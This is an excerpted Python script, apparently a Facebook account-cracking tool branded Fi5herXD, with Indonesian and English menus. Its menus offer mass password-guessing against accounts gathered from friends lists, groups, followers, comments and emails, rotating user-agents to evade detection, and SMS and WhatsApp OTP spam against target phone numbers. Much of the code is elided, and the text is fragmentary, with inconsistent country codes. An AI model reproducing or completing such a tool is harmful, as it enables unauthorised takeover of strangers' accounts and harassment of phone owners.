...
from concurrent.futures import ThreadPoolExecutor as Fi5herX
...
try:
	...
	print(' [+] Your Internet Connection Is Not Detected Please Check Your Quota Yes Greetings from Fi5herXD')
...
for brayen in range(10000):
    ...
    u6 = f"Mozilla/5.0 (Linux; Android 10; Lenovo YT- X705F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(10,500))}.0.{str(rr(1,4999))}. {str(rr(10,499))} Mobile Safari/537.36"
    u7 =f" "
    u8 =f""
    u9 =f""
    u10 =f""
...
[bold green]    /_/   /___/_____/_/ /_/_____/_/ |_|  
         """,width=90,padding=(0,8),title=f"Banner",style=f"bold blue"))
#--------------------[ BAGIAN-MASUK ]--------------#
def login123():
	os.system('clear')
	banner()
...
def menu(my_name,my_id):
	...
	dia.append(panel(f'[bold blue][+[/][bold blue]][/] [bold blue]Username : [bold green]{my_name}[/]\n[bold blue][+[/][bold blue]][/] [bold blue]User Idz : [bold green]{my_id}[/]\n[bold blue][+[/][bold blue]][/] [bold blue]Tanggal  : [bold green]{waktu}[/][/]\n[bold blue][+[/][bold blue]][/] [bold blue]Status   : [bold green]Premium[/][/]\n[bold blue][+[/][bold blue]][/] [bold blue]Versi Sc : [bold green]Update 3.2[/][/] ',width=43,padding=(0,3),style=f"bold blue"))
	dia.append(panel(f'[bold blue][+[/][bold blue]][/] [bold blue]Country  : [bold green]{negara}[/]\n[bold blue][+[/][bold blue]][/] [bold blue]City     : [bold green]{asal_kota}[/]\n[bold blue][+[/][bold blue]][/] [bold blue]Region   : [bold green]{asal_reg}[/][/]\n[bold blue][+[/][bold blue]][/] [bold blue]TimeZone : [bold green]{times}[/][/]\n[bold blue][+[/][bold blue]][/] [bold blue]My Ip    : [bold green]{ip}[/][/] ',width=43,padding=(0,3),style=f"bold blue"))
	console.print(Columns(dia))
	cetak(panel(f"[bold blue]Alvino_Xy , DerrXr , Asepit-Gans , Rozhak XD , Dapunta , Nazri XD And AOREC XD",width=90,title=f"[bold green]Thanks To",padding=(0,5),style=f"bold blue"))
	cetak(panel(f"[bold blue][[bold cyan]01[bold blue]] Crack From Friends     [bold blue][[bold cyan]06[bold blue]] Crack From Username[bold blue]      [[bold cyan]11[bold blue]] Get Headers      \n[bold blue][[bold cyan]02[bold blue]] Crack From Massal      [bold blue][[bold cyan]07[bold blue]] Crack From Followers     [[bold cyan]12[bold blue]] Spam WhatsApp      \n[bold blue][[bold cyan]03[bold blue]] Crack From Groups      [[bold cyan]08[bold blue]] Crack From Comment       [bold blue][[bold cyan]13[bold blue]] Spam Sms \n[bold blue][[bold cyan]04[bold blue]] Crack From Email       [bold blue][[bold cyan]09[bold blue]] Check Opsi Checkpoint [bold blue]   [[bold cyan]14[bold blue]] Track Ip \n[bold blue][[bold cyan]05[bold blue]] Crack From Files       [bold blue][[bold cyan]10[bold blue]] [bold blue]Check Result Crack [bold blue]      [[bold cyan]15[bold blue]] [bold red]Delete Cookies",width=90,title=f"[bold green]List Menu",style=f"bold blue"))
...
###---------[ CRACK DARI KOMEN ]---------- ###
def komen():
	cetak(panel(f"Make sure the selected target account is public, not private",width=90,padding=(0,4),style=f"bold blue"))
...
#-----------------[ CRACK GROUP ]-----------------# 
def crack_group():
	cetak(nel(' Enter Idz Group Make sure the group is public not private',width=90,padding=(0,8),style=f"bold blue"))
...
def pengikut():
	try:
		...
		exit()
	ses = requests.Session()
	cetak(panel(f"Type 'Me' If You Want To Crack From Your Own Total Followers",width=90,padding=(0,7),style=f"bold blue"))
	...
	try:
		...
		print("\r")
		cetak(panel(f"Collect Successfully {len(id)} Idz",width=90,padding=(0,22),style=f"bold blue"))
		setting()
	except requests.exceptions.ConnectionError:
...
#----------------------[ MENU CRACK LAINNYA ]----------------------#
def lainnya():
	cetak(panel(f"[[bold cyan]01[bold blue]] Crack Username                   [[bold cyan]03[bold blue]] Crack File \n[[bold cyan]02[bold blue]] Crack Followers                  [[bold cyan]04[bold blue]] Crack Email ",width=90,title=f"[bold green]Menu Crack",padding=(0,8),style=f"bold blue"))
...
def crack_nama():
	...
	cetak(panel(f"Crack Username One name you want to crack is equivalent to 3,000 usernames",width=90,padding=(0,2),style=f"bold blue"))
...
def crack_email():
	...
	if ',' in str(nama):
		...
		time.sleep(3);exit()
	cetak(nel(f'Masukan Nama Domain , Contoh : @Gmail.com, @Yahoo.com, Dll',width=90,padding=(0,9),style=f"bold blue"))
...
#-----------------[ CRACK FILE ]-----------------#
def crack_file():
	try:vin = os.listdir('/sdcard/FI5HER/')
	except FileNotFoundError:
		print(' [+] File Not Found ')
		time.sleep(2)
		back()
	if len(vin)==0:
		print(' [+] You Do not Have a Dump File ')
		time.sleep(2)
		back()
	else:
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('/sdcard/FI5HER/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
				nom = ''+str(cih)
		...
		try:geh = lol[geeh]
			...
			time.sleep(3)
			back()
		try:lin = open('/sdcard/FI5HER/'+geh,'r').read().splitlines()
		except:
...
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	cetak(panel(f'[bold blue][[bold cyan]01[/][bold blue]][/] [bold blue]Ok Results [/]\n[bold blue][[bold cyan]02[/][bold blue]][/] [bold blue]cp Results [/]\n[bold blue][[bold cyan]03[/][bold blue]][/] [bold red]Return[/]',width=90,title=f"[bold blue]• [/][bold green]List Menu Cek[/][bold blue] •[/]",style=f"bold blue"))
	kz = input(f' [+] Select : ')
	if kz in ['2','02']:
...
def brayen_dump():
	try:
		...
		exit()
	cetak(panel('\t            [bold blue]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,style='bold blue'))
...
def dump_massal():
	try:
		...
		exit()
	try:
		cetak(panel('\t            [bold blue]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,title=f"[bold green]Crack Massal",style=f"bold blue"))
...
def setting():
	...
	urut.append(panel(f'[bold blue][[bold cyan]04[/][bold blue]][/] [bold blue]Login Site [bold green]m.facebook.com[bold blue] [/]\n[bold blue][[bold cyan]05[/][bold blue]][/] [bold blue]Login Site [bold green]mbasic.facebook.com[bold blue] [/]\n[bold blue][[bold cyan]06[/][bold blue]][/] [bold blue]Login Site [bold green]free.facebook.com[bold blue] ',width=42,title=f"[bold green]Reguler",style=f"bold blue"))
	urut.append(panel(f'[bold blue][[bold cyan]07[/][bold blue]][/] [bold blue]Login Site [bold green]m.facebook.com[bold blue] [/]\n[bold blue][[bold cyan]08[/][bold blue]][/] [bold blue]Login Site [bold green]m.alpha.facebook.com[bold blue] ',width=42,title=f"[bold green]Alpha And Async",style=f"bold blue"))
	urut.append(panel(f'[bold blue][[bold cyan]09[/][bold blue]][/] [bold blue]Login Site [bold green]x.facebook.com[bold blue] [/]\n[bold blue][[bold cyan]10[/][bold blue]][/] [bold blue]Login Site [bold green]d.facebook.com[bold blue] ',width=42,title=f"[bold green]Old Metode",style=f"bold blue"))
...
[bold blue][[bold cyan]03[bold blue]] [bold blue]Using Manual Passwords [[bold red]Not Recommended[bold blue]]''',style='bold blue',title='[bold green]Setting Password',padding=(0,8),width=90))
	...
	cetak(panel(f'      [bold blue]Do you want to display related applications in the account?  Y/N',width=90,title=f"[bold green]Setting Cek Apk",style=f"bold blue"))
	...
	cetak(panel(f'      [bold blue]Do you want to display checkpoint option in account ? Y/T',width=90,title=f"[bold green]Cek Opsi",style=f"bold blue"))
	_brayen_ = input(' [+] Select : ')
	if _brayen_ in ['']:
		print(' [+] Select the right option ')
		back()
	...
	cetak(panel(f'[bold blue]Do you want to use a manual user-agent to crack an account ? Y/T',width=90,title=f"[bold green]Setting User-Agent",style=f"bold blue"))
...
def spam_sms():
	global nomor 
	cetak(panel(f'''   Enter the target number you want to spam, for example : +2348138769xxx''',width=90,padding=(0,8),style=f"bold blue"))
...
class sxp_sms:
	...
	def main(self):
		...
		cetak(panel(f"Success Spam SMS To No : +234{nomor}",width=90,padding=(0,2),style=f"bold blue"))

#------------------[ DEFF SPAM WA ]-------------------# 
    
def spam_wa():
	global nomor
	cetak(panel(f'''   Enter the target number you want to spam, for example : +2348138769949''',width=90,padding=(0,8),style=f"bold blue"))
	nomor = input(f" [+] Input No Hp : +234").replace("+234","")
	if nomor == "":
		pass
	else:
...
class sxp_wa:
	...
	def main(self):
		...
		self.wa_otp_5(nomor)
		self.wa_otp_6(nomor)
		cetak(panel(f" Sukses Spam WA Ke No : +62{nomor}",width=90,padding=(0,2),style=f"bold blue"))
